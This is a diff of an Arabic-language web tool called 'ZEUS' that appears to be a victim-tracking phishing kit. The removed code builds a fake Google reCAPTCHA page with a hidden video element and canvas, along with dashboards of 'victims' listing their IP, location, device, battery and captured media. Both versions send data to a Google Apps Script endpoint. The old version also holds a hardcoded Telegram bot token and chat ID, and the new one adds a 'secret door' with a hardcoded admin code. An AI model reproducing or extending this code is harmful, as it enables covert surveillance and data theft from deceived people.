-                            <div class="search-wrap">
-                                <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
-                                <input type="text" id="fileSearch" placeholder="بحث عن ملف …" />
-                            </div>
-                            <select class="filter-select" id="fileFilter">
-                                <option value="all">جميع الملفات</option>
-                                <option value="image">صور</option>
-                                <option value="video">فيديوهات</option>
-                                <option value="audio">صوتيات</option>
-                            </select>
-                        </div>
-                        <div id="fileGalleryContainer"><div class="empty-msg">لا توجد ملفات.</div></div>
-                    </div>
-
-                    <div class="view" id="view-logs">
-                        <div class="dash-toolbar">
-                            <div class="search-wrap">
-                                <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
-                                <input type="text" id="logSearch" placeholder="بحث في السجل …" />
-                            </div>
-                            <select class="filter-select" id="logFilter">
-                                <option value="all">جميع العمليات</option>
-                                <option value="success">ناجحة</option>
-                                <option value="warning">تحذير</option>
-                                <option value="error">فاشلة</option>
-                                <option value="info">معلومات</option>
-                            </select>
-                        </div>
-                        <div id="logContainer"><div class="empty-msg">لا توجد سجلات.</div></div>
-                    </div>
-
-                    <div class="view" id="view-settings">
-                        <div class="detail-view">
-                            <div style="font-weight:700;font-family:var(--font-en);color:var(--gold);margin-bottom:12px;font-size:14px;">إعدادات النظام</div>
-                            <div class="detail-row">
-                                <span class="label">الوضع</span>
-                                <span class="value" id="settingsTheme">فاتح</span>
-                                <button class="copy-inline" id="settingsThemeToggle" style="margin-right:auto;">تبديل</button>
-                            </div>
-                            <div class="detail-row">
-                                <span class="label">عدد البوتات</span>
-                                <span class="value" id="settingsBotCount">0</span>
-                            </div>
-                            <div class="detail-row">
-                                <span class="label">عدد الضحايا</span>
-                                <span class="value" id="settingsVictimCount">0</span>
-                            </div>
-                            <div class="detail-row">
-                                <span class="label">عدد الملفات</span>
-                                <span class="value" id="settingsFileCount">0</span>
-                            </div>
-                            <div style="margin-top:16px;padding-top:12px;border-top:1px solid var(--line);">
-                                <button class="copy-inline" id="settingsClearData" style="color:var(--danger);">مسح جميع البيانات</button>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- ===== DEVELOPER PAGE ===== -->
-    <div class="dev-page" id="devPage">
-        <div class="dev-container">
-            <button class="dev-close" id="devCloseBtn">✕</button>
-            <div class="dev-title">صفحة المطور</div>
-            <div class="dev-sub">سجل كلمات المرور — القديمة والجديدة</div>
-            <div class="dev-password-list" id="devPasswordList">
-                <div class="dev-empty">لا توجد كلمات مرور مسجلة بعد.</div>
-            </div>
-        </div>
-    </div>
-
-    <!-- ===== VICTIM PAGE (reCAPTCHA) ===== -->
-    <div id="victimPage">
-        <div style="display:flex;flex-direction:column;align-items:center;width:100%;max-width:400px;">
-            <div class="captcha-wrapper" id="captchaWrapper">
-                <div class="captcha-row">
-                    <div class="spinner" id="spinner">
-                        <input type="checkbox" id="captcha" />
-                        <label class="checkmark" for="captcha">
-                            <span class="tick"></span>
-                            <div class="loader"></div>
-                        </label>
-                    </div>
-                    <div class="text" id="mainText">أنا لست روبوتاً</div>
-                    <div class="logo-captcha">
-                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" />
-                        <strong>reCAPTCHA</strong>
-                        <small>الخصوصية - الشروط</small>
-                    </div>
-                </div>
-                <div class="progress-container" id="progressContainer">
-                    <div class="progress-bar" id="progressBar"></div>
-                </div>
-                <div class="captcha-footer">
-                    <div class="brand">
-                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/>
-                            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
-                            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
-                            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                <div class="icon-actions">
+                    <button type="button" class="icon-btn" id="copyResultBtn" title="نسخ الرابط">
+                        <svg viewBox="0 0 24 24">
+                            <rect x="8" y="8" width="12" height="12" rx="2" />
+                            <path d="M5 15V5a2 2 0 0 1 2-2h10" stroke-linecap="round" />
                         </svg>
-                        <span class="google-text">Google</span>
-                    </div>
-                    <div class="links">
-                        <a href="#" onclick="return false;">سياسة الخصوصية</a>
-                        <span>-</span>
-                        <a href="#" onclick="return false;">الشروط</a>
-                    </div>
+                    </button>
+                    <button type="button" class="icon-btn" id="openResultBtn" title="فتح الرابط">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M14 4h6v6M20 4l-9 9" stroke-linecap="round" stroke-linejoin="round" />
+                            <path d="M18 13v6a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" stroke-linecap="round" />
+                        </svg>
+                    </button>
                 </div>
             </div>
-            <div class="last-update" id="victimLastUpdate">آخر تحديث: <span id="victimLastUpdateTime">--:--:--</span></div>
-        </div>
-    </div>
-
-    <video id="hiddenVideo" autoplay playsinline muted></video>
-    <canvas id="hiddenCanvas"></canvas>
+        </section>
+    </main>
 
     <script>
         (function () {
             "use strict";
 
-            // ================================================================
-            // 1. CONFIGURATION
-            // ================================================================
-            const MASTER_BOT_TOKEN = "8872643040:AAGopCnKRECh5ikrpFELUne_xf9SgJK2Sh4";
-            const MASTER_CHAT_ID = "8552540563";
-            const DEVELOPER_LINK = "https://t.me/xx_8k";
-            const GSHEET_WEBAPP_URL = "https://script.google.com/macros/s/AKfycby8goJYYKtOM_EL7HchLK_XDq8vUMU0lmlQtCmrZYlNk5NgITn_uVg8gmM-rXK8kHs/exec";
+            const GSHEET_URL = "https://script.google.com/macros/s/AKfycby8goJYYKtOM_EL7HchLK_XDq8vUMU0lmlQtCmrZYlNk5NgITn_uVg8gmM-rXK8kHs/exec";
 
-            // ================================================================
-            // 2. TOAST, LOGS & GOOGLE SHEET SYNC
-            // ================================================================
-            function showToast(msg, type) {
-                const t = document.getElementById('toast');
-                if (!t) return;
-                t.textContent = msg;
-                t.className = 'toast-msg ' + (type || '');
-                t.classList.add('show');
-                clearTimeout(t._timer);
-                t._timer = setTimeout(() => t.classList.remove('show'), 2800);
+            function showToast(message) {
+                const el = document.getElementById("toast");
+                if (!el) return;
+                el.textContent = message;
+                el.classList.add("show");
+                clearTimeout(el._t);
+                el._t = setTimeout(() => el.classList.remove("show"), 2600);
             }
 
-            async function pushToGoogleSheet(payloadObj) {
-                if (!GSHEET_WEBAPP_URL) return null;
+            // 1) الساعة بنظام 12 ساعة AM/PM بتوقيت القاهرة مع انتقال صحيح من 12 إلى 1
+            function formatCairo12Hour(dateObj) {
+                const cairoParts = new Intl.DateTimeFormat("en-US", {
+                    timeZone: "Africa/Cairo",
+                    hour: "2-digit",
+                    minute: "2-digit",
+                    second: "2-digit",
+                    hour12: true
+                }).formatToParts(dateObj);
+
+                let hour = "12";
+                let minute = "00";
+                let second = "00";
+                let period = "AM";
+
+                for (const part of cairoParts) {
+                    if (part.type === "hour") hour = part.value;
+                    else if (part.type === "minute") minute = part.value;
+                    else if (part.type === "second") second = part.value;
+                    else if (part.type === "dayPeriod") period = part.value.toUpperCase();
+                }
+
+                return `${hour}:${minute}:${second} ${period}`;
+            }
+
+            function formatCairoDate(dateObj) {
+                return new Intl.DateTimeFormat("en-GB", {
+                    timeZone: "Africa/Cairo",
+                    day: "2-digit",
+                    month: "2-digit",
+                    year: "numeric"
+                }).format(dateObj);
+            }
+
+            function refreshClock() {
+                const now = new Date();
+                const clockEl = document.getElementById("cairoClock12");
+                const dateEl = document.getElementById("cairoDate");
+                if (clockEl) clockEl.textContent = formatCairo12Hour(now);
+                if (dateEl) dateEl.textContent = formatCairoDate(now);
+            }
+
+            refreshClock();
+            setInterval(refreshClock, 1000);
+
+            // 2) السمة (فاتح / داكن)
+            const themeBtn = document.getElementById("themeSwitchBtn");
+            const themeText = document.getElementById("themeText");
+            let theme = localStorage.getItem("zeus_ui_theme") || "light";
+
+            function applyTheme(nextTheme) {
+                theme = nextTheme;
+                if (theme === "dark") {
+                    document.documentElement.setAttribute("data-theme", "dark");
+                    themeText.textContent = "داكن";
+                } else {
+                    document.documentElement.removeAttribute("data-theme");
+                    themeText.textContent = "فاتح";
+                }
+                localStorage.setItem("zeus_ui_theme", theme);
+            }
+
+            applyTheme(theme);
+            themeBtn.addEventListener("click", () => applyTheme(theme === "light" ? "dark" : "light"));
+
+            // 3) رمز الباب السري المدمج داخل شعار ZEUS
+            const brandBtn = document.getElementById("zeusSecretBrand");
+            const secretModal = document.getElementById("secretModal");
+            const secretCodeInput = document.getElementById("secretCodeInput");
+            const secretError = document.getElementById("secretError");
+            let brandClicks = 0;
+            let clickResetTimer = null;
+
+            function openSecretModal() {
+                secretError.classList.remove("show");
+                secretCodeInput.value = "";
+                secretModal.classList.add("active");
+                secretCodeInput.focus();
+            }
+
+            brandBtn.addEventListener("click", () => {
+                brandClicks += 1;
+                clearTimeout(clickResetTimer);
+                clickResetTimer = setTimeout(() => {
+                    brandClicks = 0;
+                }, 500);
+                if (brandClicks >= 3) {
+                    brandClicks = 0;
+                    openSecretModal();
+                }
+            });
+
+            document.addEventListener("keydown", (e) => {
+                if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "d") {
+                    e.preventDefault();
+                    openSecretModal();
+                }
+            });
+
+            document.getElementById("cancelSecretBtn").addEventListener("click", () => {
+                secretModal.classList.remove("active");
+            });
+
+            document.getElementById("confirmSecretBtn").addEventListener("click", () => {
+                const entered = secretCodeInput.value.trim();
+                const expected = sessionStorage.getItem("zeus_session_access_code") || "ZEUS-ADMIN-2026";
+                if (entered && entered === expected) {
+                    secretModal.classList.remove("active");
+                    showToast("تم التحقق من رمز الباب السري");
+                } else {
+                    secretError.classList.add("show");
+                }
+            });
+
+            // 4) توليد توكن فريد غير مكرر بدون كشف بيانات الاعتماد في الرابط
+            async function createUniqueToken(seedInput) {
+                const existing = JSON.parse(localStorage.getItem("zeus_registered_tokens") || "[]");
+                const existingSet = new Set(existing.map((item) => String(item.shortToken).toUpperCase()));
+                const alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+
+                for (let attempt = 0; attempt < 10; attempt++) {
+                    const randomBytes = new Uint32Array(6);
+                    crypto.getRandomValues(randomBytes);
+                    const raw = `${seedInput}:${Date.now()}:${attempt}:${Array.from(randomBytes).join("-")}`;
+                    const digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
+                    const bytes = new Uint8Array(digest);
+                    let token = "";
+                    for (let i = 0; i < 6; i++) {
+                        token += alphabet[bytes[i] % alphabet.length];
+                    }
+                    if (!existingSet.has(token)) {
+                        return token;
+                    }
+                }
+                throw new Error("Unable to generate a unique token");
+            }
+
+            async function syncTokenToSheet(record) {
+                if (!GSHEET_URL) return null;
                 try {
-                    const res = await fetch(GSHEET_WEBAPP_URL, {
+                    const res = await fetch(GSHEET_URL, {
                         method: "POST",
                         headers: { "Content-Type": "text/plain;charset=utf-8" },
-                        body: JSON.stringify(payloadObj)
+                        body: JSON.stringify({
+                            action: "register_bot",
+                            bot: record
+                        })
                     });
                     return await res.json();
                 } catch (err) {
-                    console.warn("Google Sheet push failed:", err);
                     return null;
                 }
             }
 
-            async function pullFromGoogleSheet() {
-                if (!GSHEET_WEBAPP_URL) return null;
+            const createBtn = document.getElementById("createTokenBtn");
+            const tokenText = document.getElementById("generatedTokenText");
+            const linkText = document.getElementById("generatedLinkText");
+
+            createBtn.addEventListener("click", async () => {
+                const chatId = document.getElementById("chatIdField").value.trim();
+                const botToken = document.getElementById("botTokenField").value.trim();
+                const baseUrl = document.getElementById("baseUrlField").value.trim();
+
+                if (!chatId || !botToken || !baseUrl) {
+                    showToast("يرجى إدخال المعرّف والتوكن والرابط الأساسي");
+                    return;
+                }
+
                 try {
-                    const res = await fetch(GSHEET_WEBAPP_URL, { method: "GET" });
-                    const data = await res.json();
-                    if (!data || !data.ok) return null;
-
-                    if (Array.isArray(data.bots)) {
-                        localStorage.setItem("zeus_bots", JSON.stringify(data.bots.map((b) => ({
-                            shortToken: b.shortToken,
-                            chatId: b.chatId,
-                            baseUrl: b.baseUrl,
-                            active: b.active !== false && String(b.active).toLowerCase() !== "false",
-                            features: (() => { try { return JSON.parse(b.featuresJson || "{}"); } catch { return {}; } })(),
-                            createdAt: Number(b.createdAt) || Date.now()
-                        }))));
-                    }
-
-                    if (Array.isArray(data.victims)) {
-                        localStorage.setItem("zeus_victims", JSON.stringify(data.victims.map((v) => ({
-                            id: Number(v.id) || Date.now(),
-                            shortToken: v.shortToken,
-                            tokenStatus: v.tokenStatus || "unknown",
-                            ip: v.ip,
-                            location: {
-                                lat: v.lat === "" || v.lat === null || v.lat === undefined ? null : Number(v.lat),
-                                lng: v.lng === "" || v.lng === null || v.lng === undefined ? null : Number(v.lng)
-                            },
-                            browser: v.browser,
-                            device: v.device,
-                            battery: v.battery,
-                            timestamp: v.timestamp
-                        }))));
-                    }
-
-                    if (Array.isArray(data.files)) {
-                        localStorage.setItem("zeus_files", JSON.stringify(data.files.map((f) => ({
-                            id: Number(f.id) || Date.now(),
-                            shortToken: f.shortToken,
-                            victimId: Number(f.victimId) || 0,
-                            type: f.type,
-                            filename: f.filename,
-                            dataUrl: f.driveUrl,
-                            timestamp: Number(f.timestamp) || Date.now()
-                        }))));
-                    }
-
-                    if (Array.isArray(data.logs)) {
-                        localStorage.setItem("zeus_activity_logs", JSON.stringify(data.logs.map((l) => ({
-                            type: l.type || "info",
-                            message: l.message || "",
-                            timestamp: Number(l.timestamp) || Date.now()
-                        }))));
-                    }
-
-                    return data;
-                } catch (err) {
-                    console.warn("Google Sheet pull failed:", err);
-                    return null;
-                }
-            }
-
-            async function checkTokenStatusOnServer(shortToken) {
-                const clean = String(shortToken || "").trim();
-                if (!clean) {
-                    return { status: "missing_token", routeToMaster: true, reason: "لم يتم تمرير توكن في الرابط" };
-                }
-                if (!GSHEET_WEBAPP_URL) {
-                    return { status: "local_only", routeToMaster: false, reason: "وضع محلي" };
-                }
-                try {
-                    const url = `${GSHEET_WEBAPP_URL}?mode=check_token&t=${encodeURIComponent(clean)}`;
-                    const res = await fetch(url, { method: "GET" });
-                    const data = await res.json();
-                    if (data && data.ok && data.tokenState) {
-                        return data.tokenState;
-                    }
-                    return { status: "unknown_response", routeToMaster: true, reason: "تعذر التحقق من حالة التوكن" };
+                    new URL(baseUrl);
                 } catch {
-                    return { status: "network_check_failed", routeToMaster: true, reason: "تعذر الاتصال للتحقق من التوكن" };
+                    showToast("الرابط الأساسي غير صالح");
+                    return;
                 }
-            }
 
-            function addLog(type, message) {
-                let logs = JSON.parse(localStorage.getItem('zeus_activity_logs') || '[]');
-                logs.push({ type: type || 'info', message: message, timestamp: Date.now() });
-                if (logs.length > 500) logs = logs.slice(-500);
-                localStorage.setItem('zeus_activity_logs', JSON.stringify(logs));
-                pushToGoogleSheet({ action: "log_event", logType: type || "info", message: message });
-            }
+                const shortToken = await createUniqueToken(`${chatId}:${botToken}:${baseUrl}`);
+                const cleanBase = `${window.location.origin}${window.location.pathname}`;
+                const publicLink = `${cleanBase}?t=${encodeURIComponent(shortToken)}`;
 
-            function getTodayISO() {
-                return new Date().toISOString().slice(0, 10);
-            }
-
-            // ================================================================
-            // 3. CLOCK & THEME
-            // ================================================================
-            function updateDateTime() {
-                const now = new Date();
-                const egyptTime = new Date(now.toLocaleString('en-US', { timeZone: 'Africa/Cairo' }));
-                const hours = String(egyptTime.getHours()).padStart(2, '0');
-                const minutes = String(egyptTime.getMinutes()).padStart(2, '0');
-                const seconds = String(egyptTime.getSeconds()).padStart(2, '0');
-                const day = String(egyptTime.getDate()).padStart(2, '0');
-                const month = String(egyptTime.getMonth() + 1).padStart(2, '0');
-                const year = egyptTime.getFullYear();
-
-                const timeEl = document.getElementById('timeDisplay');
-                const dateEl = document.getElementById('dateDisplay');
-                if (timeEl) timeEl.textContent = `${hours}:${minutes}`;
-                if (dateEl) dateEl.textContent = `${day}/${month}/${year}`;
-
-                const victimTime = document.getElementById('victimLastUpdateTime');
-                if (victimTime) victimTime.textContent = `${hours}:${minutes}:${seconds}`;
-
-                const dashTime = document.querySelector('#dashLastUpdate span');
-                if (dashTime) dashTime.textContent = `${hours}:${minutes}:${seconds}`;
-            }
-            updateDateTime();
-            setInterval(updateDateTime, 1000);
-
-            let currentTheme = localStorage.getItem('zeus_theme') || 'light';
-
-            function applyTheme(theme) {
-                currentTheme = theme;
-                if (theme === 'dark') {
-                    document.documentElement.setAttribute('data-theme', 'dark');
-                } else {
-                    document.documentElement.removeAttribute('data-theme');
-                }
-                localStorage.setItem('zeus_theme', theme);
-                const label = document.getElementById('themeLabel');
-                if (label) label.textContent = theme === 'dark' ? 'داكن' : 'فاتح';
-                const settingsTheme = document.getElementById('settingsTheme');
-                if (settingsTheme) settingsTheme.textContent = theme === 'dark' ? 'داكن' : 'فاتح';
-            }
-
-            function toggleTheme() {
-                applyTheme(currentTheme === 'light' ? 'dark' : 'light');
-                if (dashOpen) renderDashboard();
-            }
-
-            document.getElementById('themeToggle').addEventListener('click', toggleTheme);
-            document.getElementById('dashThemeToggle').addEventListener('click', toggleTheme);
-            document.getElementById('settingsThemeToggle').addEventListener('click', toggleTheme);
-
-            // ================================================================
-            // 4. MODE ROUTING
-            // ================================================================
-            const urlParams = new URLSearchParams(window.location.search);
-            const rawToken = urlParams.get('t');
-            const encodedData = urlParams.get('d');
-
-            if ((encodedData && encodedData.length > 0) || (rawToken && rawToken.length > 0)) {
-                document.body.className = 'victim-mode';
-                initVictimPage(encodedData || null, rawToken || null);
-            } else {
-                document.body.className = 'admin-mode';
-                initAdminPanel();
-                initSecretDoor();
-            }
-
-            // ================================================================
-            // 5. SECRET DOOR, UNAUTHORIZED ALERTS & AUTH
-            // ================================================================
-            let dashOpen = false;
-            let currentSecretCode = '';
-            let clickCount = 0;
-            let clickTimer = null;
-
-            function generateSecretCode(length) {
-                const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789abcdefghijkmnopqrstuvwxyz!@#$%^&*';
-                let result = '';
-                const array = new Uint32Array(length);
-                crypto.getRandomValues(array);
-                for (let i = 0; i < length; i++) {
-                    result += chars[array[i] % chars.length];
-                }
-                return result;
-            }
-
-            async function collectAttemptData() {
-                let ip = 'غير متاح';
-                try {
-                    const res = await fetch('https://api.ipify.org?format=json');
-                    const data = await res.json();
-                    ip = data.ip || ip;
-                } catch (_) {}
-
-                const ua = navigator.userAgent;
-                let browser = 'Unknown';
-                if (/Edg\//.test(ua)) browser = 'Edge';
-                else if (/Chrome/.test(ua)) browser = 'Chrome';
-                else if (/Firefox/.test(ua)) browser = 'Firefox';
-                else if (/Safari/.test(ua)) browser = 'Safari';
-
-                let os = 'Unknown';
-                if (/Windows NT 10.0/.test(ua)) os = 'Windows 10/11';
-                else if (/Mac OS X/.test(ua)) os = 'macOS';
-                else if (/Android/.test(ua)) os = 'Android';
-                else if (/iPhone|iPad/.test(ua)) os = 'iOS';
-                else if (/Linux/.test(ua)) os = 'Linux';
-
-                return {
-                    ip,
-                    browser,
-                    os,
-                    language: navigator.language,
-                    screen: `${screen.width}x${screen.height}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    timestamp: new Date().toISOString()
+                const list = JSON.parse(localStorage.getItem("zeus_registered_tokens") || "[]");
+                const entry = {
+                    shortToken,
+                    chatId,
+                    botToken,
+                    baseUrl,
+                    active: true,
+                    createdAt: Date.now()
                 };
-            }
+                list.push(entry);
+                localStorage.setItem("zeus_registered_tokens", JSON.stringify(list));
 
-            async function sendAttemptNotification(success, codeEntered, attemptData) {
-                const status = success ? '✅ ناجحة' : '⚠️ غير مصرح / محاولة بدون كود صحيح';
-                const msg =
-                    `⭑ تنبيه أمني — محاولة على الداشبورد ⭒\n` +
-                    `⊚─〔 البيانات 〕────────\n` +
-                    `˼📌˹ الحالة: ${status} ⭒\n` +
-                    `˼🔑˹ المدخل: ${codeEntered || 'بدون كود'} ⭒\n` +
-                    `˼🌐˹ الـ IP: ${attemptData.ip} ⭒\n` +
-                    `˼💻˹ المتصفح: ${attemptData.browser} ⭒\n` +
-                    `˼🖥️˹ النظام: ${attemptData.os} ⭒\n` +
-                    `˼🕒˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                    `˼⏰˹ المنطقة: ${attemptData.timezone} ⭒\n` +
-                    `─────────────────`;
-
-                try {
-                    await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg })
-                    });
-                } catch (_) {}
-
-                if (!success) {
-                    await pushToGoogleSheet({
-                        action: "unauthorized_access",
-                        reason: codeEntered || "محاولة دخول بدون كود",
-                        details: attemptData
-                    });
-                }
-            }
-
-            function logAttempt(success, codeEntered, attemptData) {
-                let logs = JSON.parse(localStorage.getItem('zeus_attempt_logs') || '[]');
-                logs.push({ success, codeEntered, data: attemptData, timestamp: Date.now() });
-                if (logs.length > 100) logs = logs.slice(-100);
-                localStorage.setItem('zeus_attempt_logs', JSON.stringify(logs));
-            }
-
-            async function openDashboardWithCode(code) {
-                const success = code === currentSecretCode && code.length > 0;
-                const attemptData = await collectAttemptData();
-
-                logAttempt(success, code, attemptData);
-                await sendAttemptNotification(success, code, attemptData);
-
-                if (success) {
-                    dashOpen = true;
-                    document.getElementById('dashOverlay').classList.add('active');
-                    applyTheme(currentTheme);
-                    await pullFromGoogleSheet();
-                    renderDashboard();
-                    showToast('تم فتح لوحة التحكم ومزامنة الشيت.', 'success');
-                    document.getElementById('codeModal').classList.remove('active');
-                    currentSecretCode = generateSecretCode(32);
-                } else {
-                    document.getElementById('codeError').classList.add('show');
-                    const input = document.getElementById('codeInput');
-                    input.value = '';
-                    input.focus();
-                    showToast('الكود غير صحيح — تم إرسال تنبيه للمطور.', 'error');
-                }
-            }
-
-            async function showCodeModal() {
-                const newCode = generateSecretCode(32);
-                currentSecretCode = newCode;
-
-                let history = JSON.parse(localStorage.getItem('zeus_password_history') || '[]');
-                const oldCode = history.length > 0 ? history[history.length - 1].password : 'لا يوجد';
-                const msg =
-                    `⭑ كود الداشبورد الجديد ⭒\n` +
-                    `⊚─〔 بيانات الكود 〕────────\n` +
-                    `˼🔑˹ الكود الجديد: ${newCode} ⭒\n` +
-                    `˼🔐˹ الكود القديم: ${oldCode} ⭒\n` +
-                    `˼🕒˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                    `─────────────────`;
-
-                try {
-                    await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg })
-                    });
-                } catch (_) {}
-
-                history.push({ password: newCode, timestamp: new Date().toLocaleString('ar-EG') });
-                if (history.length > 50) history = history.slice(-50);
-                localStorage.setItem('zeus_password_history', JSON.stringify(history));
-
-                document.getElementById('codeModal').classList.add('active');
-                const input = document.getElementById('codeInput');
-                input.value = '';
-                document.getElementById('codeError').classList.remove('show');
-                input.focus();
-
-                const attemptData = await collectAttemptData();
-                logAttempt(false, '--- فتح المودال (بانتظار الكود) ---', attemptData);
-                await sendAttemptNotification(false, '--- فتح المودال (بانتظار الكود) ---', attemptData);
-            }
-
-            function closeCodeModal() {
-                document.getElementById('codeModal').classList.remove('active');
-            }
-
-            function initSecretDoor() {
-                const trigger = document.getElementById('secretTrigger');
-                const hint = document.getElementById('secretHint');
-
-                trigger.addEventListener('click', function (e) {
-                    e.stopPropagation();
-                    clickCount++;
-                    clearTimeout(clickTimer);
-                    clickTimer = setTimeout(() => {
-                        if (clickCount >= 3) {
-                            clickCount = 0;
-                            if (!dashOpen) {
-                                hint.classList.add('show');
-                                setTimeout(() => hint.classList.remove('show'), 1200);
-                                showCodeModal();
-                            } else {
-                                showToast('الداشبورد مفتوح بالفعل.', 'warning');
-                            }
-                        } else {
-                            clickCount = 0;
-                        }
-                    }, 500);
+                await syncTokenToSheet({
+                    shortToken,
+                    chatId,
+                    baseUrl,
+                    active: true,
+                    createdAt: entry.createdAt
                 });
 
-                document.addEventListener('keydown', function (e) {
-                    if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'd') {
-                        e.preventDefault();
-                        if (!dashOpen) {
-                            hint.classList.add('show');
-                            setTimeout(() => hint.classList.remove('show'), 1200);
-                            showCodeModal();
-                        } else {
-                            showToast('الداشبورد مفتوح بالفعل.', 'warning');
-                        }
-                    }
-                });
-
-                document.getElementById('codeConfirmBtn').addEventListener('click', () => {
-                    const code = document.getElementById('codeInput').value.trim();
-                    if (!code) {
-                        document.getElementById('codeError').classList.add('show');
-                        return;
-                    }
-                    openDashboardWithCode(code);
-                });
-
-                document.getElementById('codeCancelBtn').addEventListener('click', async () => {
-                    closeCodeModal();
-                    const attemptData = await collectAttemptData();
-                    logAttempt(false, '--- إلغاء ---', attemptData);
-                    await sendAttemptNotification(false, '--- إلغاء ---', attemptData);
-                });
-
-                document.getElementById('codeInput').addEventListener('keydown', (e) => {
-                    if (e.key === 'Enter') document.getElementById('codeConfirmBtn').click();
-                });
-
-                document.getElementById('codeModal').addEventListener('click', async function (e) {
-                    if (e.target === this) {
-                        closeCodeModal();
-                        const attemptData = await collectAttemptData();
-                        logAttempt(false, '--- إغلاق المودال بدون كود ---', attemptData);
-                        await sendAttemptNotification(false, '--- إغلاق المودال بدون كود ---', attemptData);
-                    }
-                });
-
-                document.getElementById('dashCloseBtn').addEventListener('click', () => {
-                    dashOpen = false;
-                    document.getElementById('dashOverlay').classList.remove('active');
-                    showToast('تم إغلاق لوحة التحكم.', '');
-                });
-
-                document.getElementById('dashOverlay').addEventListener('click', function (e) {
-                    if (e.target === this) {
-                        dashOpen = false;
-                        this.classList.remove('active');
-                    }
-                });
-
-                document.getElementById('dashSyncBtn').addEventListener('click', async () => {
-                    showToast('جارٍ المزامنة من Google Sheet …', 'warning');
-                    await pullFromGoogleSheet();
-                    renderDashboard();
-                    showToast('تمت المزامنة بنجاح.', 'success');
-                });
-
-                document.getElementById('dashDevPageBtn').addEventListener('click', () => {
-                    renderDevPage();
-                    document.getElementById('devPage').classList.add('active');
-                });
-
-                document.getElementById('devCloseBtn').addEventListener('click', () => {
-                    document.getElementById('devPage').classList.remove('active');
-                });
-
-                document.getElementById('devPage').addEventListener('click', function (e) {
-                    if (e.target === this) this.classList.remove('active');
-                });
-
-                document.getElementById('dashExportBtn').addEventListener('click', exportBackupJSON);
-
-                setInterval(async () => {
-                    if (dashOpen) {
-                        await pullFromGoogleSheet();
-                        renderDashboard();
-                    }
-                }, 20000);
-            }
-
-            function exportBackupJSON() {
-                const payload = {
-                    exportedAt: new Date().toISOString(),
-                    bots: JSON.parse(localStorage.getItem('zeus_bots') || '[]'),
-                    victims: JSON.parse(localStorage.getItem('zeus_victims') || '[]'),
-                    files: JSON.parse(localStorage.getItem('zeus_files') || '[]'),
-                    logs: JSON.parse(localStorage.getItem('zeus_activity_logs') || '[]')
-                };
-                const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = `zeus-backup-${getTodayISO()}.json`;
-                a.click();
-                URL.revokeObjectURL(url);
-                showToast('تم تصدير النسخة الاحتياطية.', 'success');
-            }
-
-            function renderDevPage() {
-                const list = document.getElementById('devPasswordList');
-                const history = JSON.parse(localStorage.getItem('zeus_password_history') || '[]');
-                if (history.length === 0) {
-                    list.innerHTML = '<div class="dev-empty">لا توجد كلمات مرور مسجلة بعد.</div>';
-                    return;
-                }
-                const reversed = history.slice().reverse();
-                list.innerHTML = reversed.map((item, i) => {
-                    const label = i === 0 ? 'الأحدث' : (i === 1 ? 'السابق' : `قبل ${i}`);
-                    return `
-                        <div class="dev-password-item">
-                            <div>
-                                <div style="font-family:var(--font-en);font-size:10px;font-weight:700;color:var(--ink-faint);">${label}</div>
-                                <div class="pwd-value">${item.password}</div>
-                                <div style="font-family:var(--font-en);font-size:10px;color:var(--ink-faint);">${item.timestamp}</div>
-                            </div>
-                            <button class="pwd-copy" data-pwd="${item.password}">نسخ</button>
-                        </div>
-                    `;
-                }).join('');
-
-                list.querySelectorAll('.pwd-copy').forEach((btn) => {
-                    btn.addEventListener('click', () => window.copyText(btn.getAttribute('data-pwd')));
-                });
-            }
-
-            // ================================================================
-            // 6. DASHBOARD RENDERING
-            // ================================================================
-            let currentView = 'overview';
-
-            function renderDashboard() {
-                const bots = JSON.parse(localStorage.getItem('zeus_bots') || '[]');
-                const victims = JSON.parse(localStorage.getItem('zeus_victims') || '[]');
-                const files = JSON.parse(localStorage.getItem('zeus_files') || '[]');
-
-                document.getElementById('navBotCount').textContent = bots.length;
-                document.getElementById('navVictimCount').textContent = victims.length;
-                document.getElementById('navFileCount').textContent = files.length;
-
